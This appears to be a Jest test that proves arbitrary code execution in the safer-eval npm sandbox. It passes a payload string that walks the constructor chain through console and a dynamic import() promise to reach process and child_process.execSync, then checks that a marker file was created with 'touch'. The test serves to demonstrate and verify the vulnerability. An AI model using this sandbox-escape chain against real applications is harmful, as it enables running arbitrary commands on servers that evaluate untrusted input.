test("Arbitrary code execution in safer-eval", () => {
  const fs = require("fs");
  const path = "./safer-eval";

  expect.assertions(2);
  try {
      fs.unlinkSync(path, function (err) {});
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const saferEval = require("safer-eval");
  try {
    saferEval(
      `console.constructor.constructor('return 1+(import("test").catch((e)=>{})["constructor"]["constructor"]("return process")().mainModule.require("child_process").execSync("touch ${path}"))')().env`
    );
  } catch (error) {console.log(error)}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
